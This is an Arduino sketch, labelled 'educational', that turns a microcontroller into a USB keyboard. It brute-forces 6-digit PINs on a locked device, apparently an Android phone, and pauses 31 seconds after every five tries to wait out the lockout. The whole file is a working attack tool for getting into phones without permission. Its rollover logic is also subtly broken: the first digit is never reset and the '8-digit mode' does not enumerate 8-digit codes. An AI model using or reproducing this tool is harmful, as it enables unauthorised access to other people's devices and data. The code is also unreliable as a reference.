/*====================================================
6–Digit PIN Brute-Force Logic (Educational)
Corrected version – Cyber Wolf
======================================================*/

#include <Keyboard.h>

char num[] = {'0','1','2','3','4','5','6','7','8','9'};

// PIN digits
int a = 0; // 1st digit
int b = 0; // 2nd digit
int c = 0; // 3rd digit
int d = 0; // 4th digit
int e = 0; // 5th digit
int f = 0; // 6th digit

// Optional 7th + 8th digit mode
int g = 0;
int h = 0;

bool eightDigitMode = false;

int attempts = 0;

void setup() {
  Keyboard.begin();
  delay(3000);  // wait for USB recognition
}

void loop() {

  // -------------------------
  // Limit: 5 attempts → wait 31 sec
  // -------------------------
  if (attempts == 5) {
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(31000);     // Android timeout simulation
    attempts = 0;     // reset attempt counter
  }

  // -------------------------
  // SEND 6-digit code
  // -------------------------
  Keyboard.write(num[a]);
  Keyboard.write(num[b]);
  Keyboard.write(num[c]);
  Keyboard.write(num[d]);
  Keyboard.write(num[e]);
  Keyboard.write(num[f]);

  // -------------------------
  // If 6-digit space overflows → start 8-digit brute mode
  // -------------------------
  if (eightDigitMode) {
    Keyboard.write(num[g]);
    Keyboard.write(num[h]);
  }

  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(1000);

  // -------------------------
  // Increase last digit
  // -------------------------
  f++;
  attempts++;

  // -------------------------
  // rollover logic
  // -------------------------
  if (f == 10) {
    f = 0;
    e++;

    if (e == 10) {
      e = 0;
      d++;

      if (d == 10) {
        d = 0;
        c++;

        if (c == 10) {
          c = 0;
          b++;

          if (b == 10) {
            b = 0;
            a++;

            if (a == 10) {
              // 6-digit space exhausted → enable 8-digit mode
              eightDigitMode = true;

              h++;  // increase 8th digit

              if (h == 10) {
                h = 0;
                g++;

                if (g == 10) {
                  // FULL cycle complete (00…99)
                  while (true); // stop
                }
              }
            }

          }
        }
      }
    }
  }
}
